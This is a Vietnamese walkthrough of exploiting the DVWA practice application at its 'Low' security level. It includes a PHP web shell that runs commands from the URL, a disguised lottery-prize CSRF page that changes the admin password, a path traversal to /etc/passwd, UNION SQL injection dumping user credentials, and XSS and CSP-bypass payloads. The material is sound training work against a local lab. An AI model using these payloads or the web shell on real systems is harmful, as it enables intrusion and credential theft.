# DVWA - Security Level: Low

## 1. Brute Force  
Su dung BurpSuite bat request khi thuc hien dang nhap:  
![Brute Forces_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Brute%20Forces_1.png)  
Su dung tinh nang **Intruder**, thu bruteforces voi tai khoan **admin**:  
![Brute Forces_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Brute%20Forces_2.png)  
Ket qua:  
![Brute Forces_3](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Brute%20Forces_3.png)  
Tai khoan: **admin**  
Mat khau: **password**  
## 2. Command Injection  
Nhap **8.8.8.8** vao input box:  
![Command Injection_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Command%20Injection_1.png)  
Chuc nang **Ping a device** thuc hien cau lenh **ping -c 4**, thu su dung ky tu **';'** de ket hop voi cac cau lenh khac:  
![Command Injection_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Command%20Injection_2.png)  
## 3. CSRF  
Khi su dung chuc nang **Change your admin password**, he thong se gui GET request nhu sau:  
![CSRF_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/CSRF_1.png)  
Trong GET request chi co thong tin ve PHPSESSID de xac dinh xem user nao dang gui request. Tao mot trang web index.html nhu sau:  
```
<!DOCTYPE html>
<html lang = "en">
<head>
  <meta charset = "UTF-8">
  <title> Vietlott </title>
</head>
<body>
  <h1> Chuc mung ban da trung Vietlott 100.000.000.000 VND </h1>
  <img style="display:none" src="http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=abc123&password_conf=abc123&Change=Change" alt="">
</body>
</html>
```  
Khi nguoi dung truy cap vao trang web tren se kich hoat HTTP request toi chuc nang **Change your admin password** cua **DVWA**, neu nguoi dung dang truy cap trang **DVWA** voi tai khoan **admin**, trinh duyet se tu dong su dung PHPSESSID cua nguoi dung de gui request thay doi mat khau thanh **abc123**.  
Kiem tra lai tai khoan **admin** voi mat khau **abc123**  
![CSRF_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/CSRF_2.png)
## 4. File Inclusion  

```
http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php
http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file2.php
http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file3.php
```  
Duong dan **/?page=** se tro den 1 file tren server, vi vay ta co the thu truy cap toi cac file khac tren server (vi du /etc/passwd) bang cach them **../** vao URL nhu sau:
```
http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
```  
![File Inclusion_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/File%20Inclusion_1.png)  
## 5. File Upload  
Kiem tra chuc nang upload bang cach upload file shell.php:  
**shell.php**  
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```  
![File Upload_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/File%20Upload_1.png)  
Truy cap toi URL cua file shell.php:  
![File Upload_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/File%20Upload_2.png)  
Chuc nang File Upload khong thuc hien kiem tra file duoc upload len web co phai la file img khong, dan toi viec co the upload cac file khong hop le.  
## 6. Insecure Captcha  
Chuc nang **Change your password** su dung reCAPTCHA chia lam 2 **step** tuong ung voi 2 POST request:  
**step 1**  su dung **g-recaptcha-response** 
![Insecure CAPTCHA_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Insecure%20CAPTCHA_1.png)  
Nhung sau khi xac nhan **step 1**, **step 2** khong su dung tiep **g-recaptcha-response**:  
![Insecure CAPTCHA_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Insecure%20CAPTCHA_2.png)  
Vi vay, co the gui lai POST request **step 2** ma khong can co thong tin **g-recaptcha-response** de thay doi mat khau cua tai khoan:  
![Insecure CAPTCHA_3](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Insecure%20CAPTCHA_3.png)  
## 7. SQL Injection  
Nhap thu **"1"** vao input box:  
![SQL Injection_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_1.png)  
Khi nhap **User ID = 1** trang web se tra ve thong tin cua **ID, First name, Surname**, vi vay cau lenh query co the la:  
**SELECT first_name, last_name FROM users WHERE user_id = id;**  
Thu kiem tra so column cua cau lenh query bang canh nhap **'UNION ODER BY 2--**  
![SQL Injection_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_2.png)  
Kiem tra cac table trong database bang lenh query:  
**' UNION SELECT null, table_name FROM INFORMATION_SCHEMA.TABLES-- -**  
![SQL Injection_3](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_3.png)  
Co table **users**, kiem tra cac column trong table **users** bang lenh query:  
**' UNION SELECT null, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 'dvwa' and table_name = 'users'-- -**    
![SQL Injection_4](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_4.png)  
Trong table **user** co 2 column **user, password**, kiem tra 2 columns bang lenh query:  
**' UNION SELECT user, password FROM users-- -**  
![SQL Injection_5](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection_5.png)  
Ta co cac thong tin ve **user, password**, **password** dang duoc ma hoa MD5. Sau khi giai ma:  
**admin - password  
gordonb - abc123  
1337 - charley  
pablo - letmein  
smithy - password**  
## 8. SQL Injection (Blind)  
Chuc nang **User ID** kiem tra xem co user id ma nguoi dung nhap vao trong database khong:  
![SQL Injection (Blind)\_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection%20(Blind)_1.png)  
Kiem tra SQL Injection bang lenh query:  
**' AND SLEEP(1)-- -**  
Su dung chuc nang **Intruder** cua **BurpSuite** de kiem tra voi cac gia tri sleep khac nhau:  
![SQL Injection (Blind)\_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/SQL%20Injection%20(Blind)_2.png)  
## 9. Weak Session IDs  
Khi chon **Generate**, trang web tao ra mot gia tri **dvwaSession** co gia tri **1**:  
![Weak Session IDs_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Weak%20Session%20IDs_1.png)  
Tiep tu chon **Generate**, gia tri **dvwaSession** thay doi thanh **2**:  
![Weak Session IDs_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/Weak%20Session%20IDs_2.png)  
Gia tri cua **dvwaSession** tang dan moi lan chon **Generate**, vi vay co the de dang doan hoac thu duoc gia tri **dvwaSession**.  
## 10. XSS (DOM)  
Trang web co chuc nang chon mot trong cac ngon ngu khac nhau, chuc nang nay chua duoc kiem tra tinh hop le khi nhap input khi thu chen doan script:  
```
<script> alert(1) </script>
```  
![XSS (DOM)\_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/XSS%20(DOM)_1.png) 
## 11. XSS (Reflected)  
Khai thac loi XSS (Reflected) bang doan script:
```
<script> alert(1) </script>
```  
![XSS (Reflected)\_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/XSS%20(Reflected)_1.png)  
## 12. XSS (Stored)  
Khai thac loi XSS (Stored) bang cach **Sign Guestbook** voi noi dung:  
```
<script> alert(1) </script>
```  
![XSS (Stored)\_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/XSS%20(Stored)_1.png)  
## 13. CSP Bypass  
Co the chay script tu cac nguon sau:  
```
Content-Security-Policy
	script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;
```  
Su dung hastebin tao mot doan script **alert(1);**:  
![CSP Bypass_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/CSP%20Bypass_1.png)  
Nhap duong dan vao o input va chon **Include**:  
![CSP Bypass_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/CSP%20Bypass_2.png)  
## 14. JavaScript  
Khi nhap **'success'** va chon **Summit**, nhan duoc thong bao **Invalid Token**:  
![JavaScript_1](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/JavaScript_1.png)
Inspect trang web, co doan script tao token nhu sau:    
```
function rot13(inp) {
		return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
	}
function generate_token() {
		var phrase = document.getElementById("phrase").value;
		document.getElementById("token").value = md5(rot13(phrase));
	}
```  
De tao ra token, page da su dung ham rot13 sau do ma hoa bang MD5.  
Tao token voi tu khoa **'success'** tren Kali Linux:  
**echo -n ‘success’ | tr ‘A-Za-z’ ‘N-ZA-Mn-za-m’ | md5sum**  
![JavaScript_2](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/JavaScript_2.png)  
Su dung BurpSuite de bat goi tin khi nhap tu khoa **'success'**:  
![JavaScript_3](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/JavaScript_3.png)   
Thay gia tri token vua tao bang tu khoa **'success'**:38581812b435834ebf84ebcc2c6424d6  
![JavaScript_4](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/JavaScript_4.png)  
Ket qua:  
![JavaScript_5](https://github.com/ckiev5/DVWA/blob/main/Images/Low%20Level/JavaScript_5.png) 
